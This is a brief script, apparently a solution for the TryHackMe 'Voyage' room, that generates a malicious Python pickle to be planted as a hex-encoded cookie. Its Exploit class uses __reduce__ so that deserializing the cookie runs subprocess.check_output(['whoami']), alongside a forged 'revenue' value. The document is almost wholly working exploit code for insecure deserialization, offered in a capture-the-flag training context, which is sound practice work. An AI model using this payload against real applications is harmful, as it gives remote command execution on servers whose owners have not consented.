# for tryhackme room Voyage https://tryhackme.com/room/voyage
# run below on terminal
# Youtube video walk through: https://youtu.be/vB2KG0V-oc0

python3 - <<'PY'
import pickle, binascii, subprocess

class Exploit:
    def __reduce__(self):
        return subprocess.check_output, (['whoami'],)

cookie = {'user': Exploit(), 'revenue': '999999'}
raw = pickle.dumps(cookie, protocol=4)
print(binascii.hexlify(raw).decode())
PY
